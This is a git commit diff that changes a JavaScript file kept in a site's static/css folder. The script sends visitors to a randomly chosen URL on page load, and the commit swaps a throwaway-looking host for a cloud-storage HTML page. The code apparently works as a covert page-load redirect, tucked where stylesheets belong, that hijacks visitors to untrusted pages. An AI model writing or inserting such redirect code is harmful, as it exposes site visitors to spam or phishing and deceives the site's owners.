78dc52c81dbf5308e13dc4ffc7f5770ff6522bcd
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-27 18:57:34 +0800

    Update mt8.js

--- static/css/mt8.js
+++ static/css/mt8.js
@@ -1,4 +1,4 @@
-var urls=[' http://pbwci.qun.hk./Fl-1nhLr7F_1MZtrk1o7u38TKE9G#{nnnnnnn}{wwww}',];
+var urls=[' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/8cbf4bf3af9c49038c7b9c099247ad43.html#{nnnnnnn}{wwww}',];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
 	return s.replace(/\{(\w+?)\}/g,function(a,b){
